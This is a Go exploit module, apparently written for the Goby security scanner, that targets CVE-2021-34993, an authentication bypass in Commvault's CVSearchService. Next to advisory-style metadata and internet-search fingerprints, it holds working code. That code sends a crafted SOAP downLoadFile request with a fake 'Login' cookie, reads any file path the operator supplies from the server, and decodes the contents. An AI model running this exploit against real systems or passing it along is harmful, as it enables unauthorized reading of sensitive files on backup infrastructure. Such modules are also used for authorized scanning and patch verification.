package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Commvault CVSearchService Authentication Bypass (CVE-2021-34993)",
    "Description": "<p>Commvault software is a platform that can be used for data backup and recovery, cloud and infrastructure management.</p><p>There are specific flaws in the Commvault platform CVSearchService service. Attackers can use authentication to bypass the system to read arbitrary files to obtain sensitive information.</p>",
    "Impact": "Commvault CVSearchService Authentication Bypass (CVE-2021-34993)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.commvault.com\">https://www.commvault.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Commvault",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Commvault 平台 CVSearchService 认证绕过漏洞（CVE-2021-34993）",
            "Description": "<p>Commvault软件是一个可用于数据备份和恢复，云和基础架构管理平台。</p><p>Commvault平台CVSearchService服务中存在特定缺陷。攻击者可以利用绕过系统的身份验证读取任意文件获取敏感信息。</p>",
            "Impact": "<p>Commvault平台CVSearchService服务中存在特定缺陷。攻击者可以利用绕过系统的身份验证读取任意文件获取敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.commvault.com\">https://www.commvault.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Commvault",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Commvault CVSearchService Authentication Bypass (CVE-2021-34993)",
            "Description": "<p>Commvault software is a platform that can be used for data backup and recovery, cloud and infrastructure management.</p><p>There are specific flaws in the Commvault platform CVSearchService service. Attackers can use authentication to bypass the system to read arbitrary files to obtain sensitive information.</p>",
            "Impact": "Commvault CVSearchService Authentication Bypass (CVE-2021-34993)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.commvault.com\">https://www.commvault.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Commvault",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "banner=\"Server: Commvault\" || header=\"Server: Commvault\" || body=\"cvUtil.CONTEXT_PATH = '/webconsole'\"",
    "GobyQuery": "banner=\"Server: Commvault\" || header=\"Server: Commvault\" || body=\"cvUtil.CONTEXT_PATH = '/webconsole'\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.commvault.com/",
    "DisclosureDate": "2021-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-34993"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-1856"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "C:/Windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Commvault"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10238"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/SearchSvc/CVSearchService.svc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("soapaction", "http://tempuri.org/ICVSearchSvc/downLoadFile")
			cfg.Header.Store("Cookie", "Login")
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <tem:downLoadFile>\r\n         <tem:path>C:/Windows/win.ini</tem:path>\r\n      </tem:downLoadFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>"
			u = httpclient.NewFixUrl(u.IP + ":81")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<downLoadFileResponse xmlns=\"http://tempuri.org/\"")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/SearchSvc/CVSearchService.svc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("soapaction", "http://tempuri.org/ICVSearchSvc/downLoadFile")
			cfg.Header.Store("Cookie", "Login")
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Data = fmt.Sprintf("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <tem:downLoadFile>\r\n         <tem:path>%s</tem:path>\r\n      </tem:downLoadFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>", cmd)
			expResult.HostInfo = httpclient.NewFixUrl(expResult.HostInfo.IP + ":81")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					body := regexp.MustCompile("<downLoadFileResult>(.*?)</downLoadFileResult>").FindStringSubmatch(resp.RawBody)
					bodyBase64, _ := base64.StdEncoding.DecodeString(body[1])
					expResult.Output = string(bodyBase64)
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
